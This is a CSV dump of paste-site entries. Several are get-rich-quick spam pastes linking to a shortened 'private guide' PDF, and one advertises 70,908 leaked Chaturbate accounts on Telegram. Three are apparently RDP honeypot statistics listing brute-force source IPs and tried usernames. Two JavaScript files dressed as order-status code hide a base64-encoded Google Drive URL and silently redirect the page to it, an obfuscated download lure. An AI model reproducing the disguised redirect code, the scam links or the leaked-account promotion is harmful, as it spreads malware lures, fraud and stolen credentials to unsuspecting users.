id,title,username,language,date,content
SKLV7PTx,EARN $900 INSTANTLY 2025 M6,furAldy,JavaScript,Friday 25th of April 2025 07:21:54 PM CDT," 
Pdf https://tinyurl.com/privguidee

aiBfjgBUV7
"
0QtQ1R92,2025-04-24_stats.json,rdp_snitch,JSON,Friday 25th of April 2025 07:18:21 PM CDT,"{
  ""ip"": {
    ""152.230.66.217"": 993,
    ""80.94.95.198"": 54,
    ""211.185.207.14"": 30,
    ""91.238.181.91"": 6,
    ""71.82.170.60"": 30,
    ""194.165.16.165"": 6,
    ""38.165.7.74"": 6,
    ""205.210.31.163"": 9,
    ""152.32.252.94"": 3,
    ""193.176.22.13"": 18,
    ""62.60.188.24"": 3,
    ""167.71.75.52"": 75,
    ""52.142.43.71"": 192,
    ""156.227.234.181"": 3,
    ""205.210.31.94"": 9,
    ""221.181.44.30"": 6,
    ""88.214.50.50"": 18,
    ""191.96.106.18"": 3132,
    ""80.94.95.90"": 3,
    ""61.219.85.85"": 3,
    ""198.235.24.55"": 9,
    ""91.238.181.93"": 6,
    ""165.154.58.251"": 3,
    ""194.165.16.163"": 6,
    ""212.56.53.170"": 1635,
    ""37.61.243.211"": 3,
    ""159.89.6.147"": 600,
    ""147.185.132.210"": 9,
    ""167.94.145.97"": 3
  },
  ""asn"": {
    ""AS14259"": 993,
    ""AS204428"": 57,
    ""AS4766"": 30,
    ""AS49434"": 12,
    ""AS20115"": 30,
    ""AS48721"": 12,
    ""AS23470"": 6,
    ""AS396982"": 36,
    ""AS135377"": 6,
    ""Unknown"": 1671,
    ""AS215930"": 3,
    ""AS14061"": 675,
    ""AS8075"": 192,
    ""AS138152"": 3,
    ""AS9808"": 6,
    ""AS174"": 3132,
    ""AS3462"": 3,
    ""AS30781"": 3,
    ""AS398705"": 3
  },
  ""isp"": {
    ""Gtd Internet S.A."": 993,
    ""SS-Net"": 57,
    ""Korea Telecom"": 30,
    ""Datacenter location PAR1 France"": 12,
    ""Charter Communications"": 30,
    ""Flyservers S.A."": 12,
    ""ReliableSite.Net LLC"": 6,
    ""Google LLC"": 36,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 6,
    ""SIA \""Singularity Telecom\"""": 36,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 3,
    ""DigitalOcean, LLC"": 675,
    ""Microsoft Corporation"": 192,
    ""Yisu Cloud Ltd"": 3,
    ""China Mobile communications corporation"": 6,
    ""Cogent Communications"": 3132,
    ""Chunghwa Telecom Co., Ltd."": 3,
    ""VPN Consumer Ashburn"": 1635,
    ""DC4Data"": 3,
    ""Censys, Inc."": 3
  },
  ""org"": {
    ""Gtd Internet S.A"": 993,
    ""Unmanaged LTD"": 57,
    ""Kornet"": 30,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""Spectrum"": 30,
    ""Flyservers S.A"": 12,
    ""PEG Tech Inc"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""SIA \""Singularity Telecom\"""": 36,
    ""UAB Host Baltic"": 3,
    ""DigitalOcean, LLC"": 675,
    ""Microsoft Azure Cloud (eastus)"": 192,
    ""Yisu Cloud Ltd"": 3,
    ""China Mobile"": 6,
    ""Ipxo"": 3132,
    ""Chunghwa Telecom Co. Ltd."": 3,
    ""Ucloud Information Technology"": 3,
    ""VPN Consumer Ashburn, VA, United States"": 1635,
    ""DcforData SRL"": 3,
    ""Censys, Inc."": 3
  },
  ""regionName"": {
    ""Santiago Metropolitan"": 993,
    ""Budapest"": 57,
    ""Sejong-si"": 30,
    ""\u00cele-de-France"": 12,
    ""Wisconsin"": 30,
    ""Kaunas"": 12,
    ""California"": 4809,
    ""Kowloon"": 3,
    ""New York"": 36,
    ""Tehran"": 3,
    ""North Holland"": 75,
    ""Virginia"": 192,
    ""\u014csaka"": 3,
    ""Guangdong"": 6,
    ""New Taipei City"": 3,
    ""Metro Manila"": 3,
    ""Auvergne-Rh\u00f4ne-Alpes"": 3,
    ""Hesse"": 600,
    ""Michigan"": 3
  },
  ""country"": {
    ""Chile"": 993,
    ""Hungary"": 57,
    ""South Korea"": 30,
    ""France"": 15,
    ""United States"": 5070,
    ""Lithuania"": 12,
    ""Hong Kong"": 3,
    ""Iran"": 3,
    ""The Netherlands"": 75,
    ""Japan"": 3,
    ""China"": 6,
    ""Taiwan"": 3,
    ""Philippines"": 3,
    ""Germany"": 600
  },
  ""account"": {
    ""hello"": 6651,
    ""142.93.8.59"": 114,
    ""Test"": 36,
    ""QRMupMsWI"": 3,
    ""KJpCKf"": 3,
    ""wcJlYu"": 3,
    ""Administrator"": 6,
    ""hLgdNOvGE"": 3,
    ""UyvLBl"": 3,
    ""UVHSHx"": 3,
    ""Domain"": 24,
    ""Administr"": 3,
    ""hpOvyxCBc"": 3,
    ""SUcNWJ"": 3,
    ""IzgcEw"": 3,
    ""aEEaxVaWV"": 3,
    ""KOUPop"": 3,
    ""fbYjWP"": 3,
    ""(empty)"": 3
  },
  ""keyboard"": {
    ""Unknown"": 6873
  },
  ""client_build"": {
    ""Unknown"": 6873
  },
  ""client_name"": {
    ""Unknown"": 6873
  },
  ""ip_type"": {
    ""Unknown"": 2805,
    ""hosting"": 921,
    ""hosting & proxy"": 9,
    ""mobile"": 6,
    ""proxy"": 3132
  }
}"
q3xUP7AD,2025-04-24_stats.json,rdp_snitch,JSON,Friday 25th of April 2025 07:16:15 PM CDT,"{
  ""ip"": {
    ""152.230.66.217"": 992,
    ""80.94.95.198"": 54,
    ""211.185.207.14"": 30,
    ""91.238.181.91"": 6,
    ""71.82.170.60"": 30,
    ""194.165.16.165"": 6,
    ""38.165.7.74"": 6,
    ""205.210.31.163"": 9,
    ""152.32.252.94"": 3,
    ""193.176.22.13"": 18,
    ""62.60.188.24"": 3,
    ""167.71.75.52"": 75,
    ""52.142.43.71"": 192,
    ""156.227.234.181"": 3,
    ""205.210.31.94"": 9,
    ""221.181.44.30"": 6,
    ""88.214.50.50"": 18,
    ""191.96.106.18"": 3132,
    ""80.94.95.90"": 3,
    ""61.219.85.85"": 3,
    ""198.235.24.55"": 9,
    ""91.238.181.93"": 6,
    ""165.154.58.251"": 3,
    ""194.165.16.163"": 6,
    ""212.56.53.170"": 1635,
    ""37.61.243.211"": 3,
    ""159.89.6.147"": 600,
    ""147.185.132.210"": 9,
    ""167.94.145.97"": 3
  },
  ""asn"": {
    ""AS14259"": 992,
    ""AS204428"": 57,
    ""AS4766"": 30,
    ""AS49434"": 12,
    ""AS20115"": 30,
    ""AS48721"": 12,
    ""AS23470"": 6,
    ""AS396982"": 36,
    ""AS135377"": 6,
    ""Unknown"": 1671,
    ""AS215930"": 3,
    ""AS14061"": 675,
    ""AS8075"": 192,
    ""AS138152"": 3,
    ""AS9808"": 6,
    ""AS174"": 3132,
    ""AS3462"": 3,
    ""AS30781"": 3,
    ""AS398705"": 3
  },
  ""isp"": {
    ""Gtd Internet S.A."": 992,
    ""SS-Net"": 57,
    ""Korea Telecom"": 30,
    ""Datacenter location PAR1 France"": 12,
    ""Charter Communications"": 30,
    ""Flyservers S.A."": 12,
    ""ReliableSite.Net LLC"": 6,
    ""Google LLC"": 36,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 6,
    ""SIA \""Singularity Telecom\"""": 36,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 3,
    ""DigitalOcean, LLC"": 675,
    ""Microsoft Corporation"": 192,
    ""Yisu Cloud Ltd"": 3,
    ""China Mobile communications corporation"": 6,
    ""Cogent Communications"": 3132,
    ""Chunghwa Telecom Co., Ltd."": 3,
    ""VPN Consumer Ashburn"": 1635,
    ""DC4Data"": 3,
    ""Censys, Inc."": 3
  },
  ""org"": {
    ""Gtd Internet S.A"": 992,
    ""Unmanaged LTD"": 57,
    ""Kornet"": 30,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""Spectrum"": 30,
    ""Flyservers S.A"": 12,
    ""PEG Tech Inc"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""SIA \""Singularity Telecom\"""": 36,
    ""UAB Host Baltic"": 3,
    ""DigitalOcean, LLC"": 675,
    ""Microsoft Azure Cloud (eastus)"": 192,
    ""Yisu Cloud Ltd"": 3,
    ""China Mobile"": 6,
    ""Ipxo"": 3132,
    ""Chunghwa Telecom Co. Ltd."": 3,
    ""Ucloud Information Technology"": 3,
    ""VPN Consumer Ashburn, VA, United States"": 1635,
    ""DcforData SRL"": 3,
    ""Censys, Inc."": 3
  },
  ""regionName"": {
    ""Santiago Metropolitan"": 992,
    ""Budapest"": 57,
    ""Sejong-si"": 30,
    ""\u00cele-de-France"": 12,
    ""Wisconsin"": 30,
    ""Kaunas"": 12,
    ""California"": 4809,
    ""Kowloon"": 3,
    ""New York"": 36,
    ""Tehran"": 3,
    ""North Holland"": 75,
    ""Virginia"": 192,
    ""\u014csaka"": 3,
    ""Guangdong"": 6,
    ""New Taipei City"": 3,
    ""Metro Manila"": 3,
    ""Auvergne-Rh\u00f4ne-Alpes"": 3,
    ""Hesse"": 600,
    ""Michigan"": 3
  },
  ""country"": {
    ""Chile"": 992,
    ""Hungary"": 57,
    ""South Korea"": 30,
    ""France"": 15,
    ""United States"": 5070,
    ""Lithuania"": 12,
    ""Hong Kong"": 3,
    ""Iran"": 3,
    ""The Netherlands"": 75,
    ""Japan"": 3,
    ""China"": 6,
    ""Taiwan"": 3,
    ""Philippines"": 3,
    ""Germany"": 600
  },
  ""account"": {
    ""hello"": 6650,
    ""142.93.8.59"": 114,
    ""Test"": 36,
    ""QRMupMsWI"": 3,
    ""KJpCKf"": 3,
    ""wcJlYu"": 3,
    ""Administrator"": 6,
    ""hLgdNOvGE"": 3,
    ""UyvLBl"": 3,
    ""UVHSHx"": 3,
    ""Domain"": 24,
    ""Administr"": 3,
    ""hpOvyxCBc"": 3,
    ""SUcNWJ"": 3,
    ""IzgcEw"": 3,
    ""aEEaxVaWV"": 3,
    ""KOUPop"": 3,
    ""fbYjWP"": 3,
    ""(empty)"": 3
  },
  ""keyboard"": {
    ""Unknown"": 6872
  },
  ""client_build"": {
    ""Unknown"": 6872
  },
  ""client_name"": {
    ""Unknown"": 6872
  },
  ""ip_type"": {
    ""Unknown"": 2804,
    ""hosting"": 921,
    ""hosting & proxy"": 9,
    ""mobile"": 6,
    ""proxy"": 3132
  }
}"
tyf6aAci,2025-04-24_stats.json,rdp_snitch,JSON,Friday 25th of April 2025 07:15:10 PM CDT,"{
  ""ip"": {
    ""152.230.66.217"": 991,
    ""80.94.95.198"": 54,
    ""211.185.207.14"": 30,
    ""91.238.181.91"": 6,
    ""71.82.170.60"": 30,
    ""194.165.16.165"": 6,
    ""38.165.7.74"": 6,
    ""205.210.31.163"": 9,
    ""152.32.252.94"": 3,
    ""193.176.22.13"": 18,
    ""62.60.188.24"": 3,
    ""167.71.75.52"": 75,
    ""52.142.43.71"": 192,
    ""156.227.234.181"": 3,
    ""205.210.31.94"": 9,
    ""221.181.44.30"": 6,
    ""88.214.50.50"": 18,
    ""191.96.106.18"": 3132,
    ""80.94.95.90"": 3,
    ""61.219.85.85"": 3,
    ""198.235.24.55"": 9,
    ""91.238.181.93"": 6,
    ""165.154.58.251"": 3,
    ""194.165.16.163"": 6,
    ""212.56.53.170"": 1635,
    ""37.61.243.211"": 3,
    ""159.89.6.147"": 600,
    ""147.185.132.210"": 9,
    ""167.94.145.97"": 3
  },
  ""asn"": {
    ""AS14259"": 991,
    ""AS204428"": 57,
    ""AS4766"": 30,
    ""AS49434"": 12,
    ""AS20115"": 30,
    ""AS48721"": 12,
    ""AS23470"": 6,
    ""AS396982"": 36,
    ""AS135377"": 6,
    ""Unknown"": 1671,
    ""AS215930"": 3,
    ""AS14061"": 675,
    ""AS8075"": 192,
    ""AS138152"": 3,
    ""AS9808"": 6,
    ""AS174"": 3132,
    ""AS3462"": 3,
    ""AS30781"": 3,
    ""AS398705"": 3
  },
  ""isp"": {
    ""Gtd Internet S.A."": 991,
    ""SS-Net"": 57,
    ""Korea Telecom"": 30,
    ""Datacenter location PAR1 France"": 12,
    ""Charter Communications"": 30,
    ""Flyservers S.A."": 12,
    ""ReliableSite.Net LLC"": 6,
    ""Google LLC"": 36,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 6,
    ""SIA \""Singularity Telecom\"""": 36,
    ""Cipher Operations DOO Beograd - Novi Beograd"": 3,
    ""DigitalOcean, LLC"": 675,
    ""Microsoft Corporation"": 192,
    ""Yisu Cloud Ltd"": 3,
    ""China Mobile communications corporation"": 6,
    ""Cogent Communications"": 3132,
    ""Chunghwa Telecom Co., Ltd."": 3,
    ""VPN Consumer Ashburn"": 1635,
    ""DC4Data"": 3,
    ""Censys, Inc."": 3
  },
  ""org"": {
    ""Gtd Internet S.A"": 991,
    ""Unmanaged LTD"": 57,
    ""Kornet"": 30,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""Spectrum"": 30,
    ""Flyservers S.A"": 12,
    ""PEG Tech Inc"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""SIA \""Singularity Telecom\"""": 36,
    ""UAB Host Baltic"": 3,
    ""DigitalOcean, LLC"": 675,
    ""Microsoft Azure Cloud (eastus)"": 192,
    ""Yisu Cloud Ltd"": 3,
    ""China Mobile"": 6,
    ""Ipxo"": 3132,
    ""Chunghwa Telecom Co. Ltd."": 3,
    ""Ucloud Information Technology"": 3,
    ""VPN Consumer Ashburn, VA, United States"": 1635,
    ""DcforData SRL"": 3,
    ""Censys, Inc."": 3
  },
  ""regionName"": {
    ""Santiago Metropolitan"": 991,
    ""Budapest"": 57,
    ""Sejong-si"": 30,
    ""\u00cele-de-France"": 12,
    ""Wisconsin"": 30,
    ""Kaunas"": 12,
    ""California"": 4809,
    ""Kowloon"": 3,
    ""New York"": 36,
    ""Tehran"": 3,
    ""North Holland"": 75,
    ""Virginia"": 192,
    ""\u014csaka"": 3,
    ""Guangdong"": 6,
    ""New Taipei City"": 3,
    ""Metro Manila"": 3,
    ""Auvergne-Rh\u00f4ne-Alpes"": 3,
    ""Hesse"": 600,
    ""Michigan"": 3
  },
  ""country"": {
    ""Chile"": 991,
    ""Hungary"": 57,
    ""South Korea"": 30,
    ""France"": 15,
    ""United States"": 5070,
    ""Lithuania"": 12,
    ""Hong Kong"": 3,
    ""Iran"": 3,
    ""The Netherlands"": 75,
    ""Japan"": 3,
    ""China"": 6,
    ""Taiwan"": 3,
    ""Philippines"": 3,
    ""Germany"": 600
  },
  ""account"": {
    ""hello"": 6649,
    ""142.93.8.59"": 114,
    ""Test"": 36,
    ""QRMupMsWI"": 3,
    ""KJpCKf"": 3,
    ""wcJlYu"": 3,
    ""Administrator"": 6,
    ""hLgdNOvGE"": 3,
    ""UyvLBl"": 3,
    ""UVHSHx"": 3,
    ""Domain"": 24,
    ""Administr"": 3,
    ""hpOvyxCBc"": 3,
    ""SUcNWJ"": 3,
    ""IzgcEw"": 3,
    ""aEEaxVaWV"": 3,
    ""KOUPop"": 3,
    ""fbYjWP"": 3,
    ""(empty)"": 3
  },
  ""keyboard"": {
    ""Unknown"": 6871
  },
  ""client_build"": {
    ""Unknown"": 6871
  },
  ""client_name"": {
    ""Unknown"": 6871
  },
  ""ip_type"": {
    ""Unknown"": 2803,
    ""hosting"": 921,
    ""hosting & proxy"": 9,
    ""mobile"": 6,
    ""proxy"": 3132
  }
}"
rV3YytxQ,Make $1000 15-MINUTES (BEGINNER) 96,furAldy,JavaScript,Friday 25th of April 2025 07:12:39 PM CDT," 
Pdf https://tinyurl.com/privguidee

oPLmIXHoNU
"
Awc6WDm4,Products.js,Ratqueenkslskskwkw,JavaScript,Friday 25th of April 2025 07:08:34 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/67979/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FeUAqtxK,Chaturbate with Tokens,WantingTrae,JavaScript,Friday 25th of April 2025 07:08:19 PM CDT,70908 Accounts Posted On https://t.me/leakedbyem1nem
mRv32BJM,EARN $900 INSTANTLY 2025⭐ NU,furAldy,JavaScript,Friday 25th of April 2025 07:03:22 PM CDT," 
Pdf https://tinyurl.com/privguidee

NgKNaLBsz6
"
DQwxM6Ya,Make $1000 15-MINUTES  (BEGINNER) ME,furAldy,JavaScript,Friday 25th of April 2025 06:54:06 PM CDT," 
Pdf https://tinyurl.com/privguidee

nlSv1MtF7L
"
3TRt20BB,Order.js,Ratqueenkslskskwkw,JavaScript,Friday 25th of April 2025 06:53:11 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/19730/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
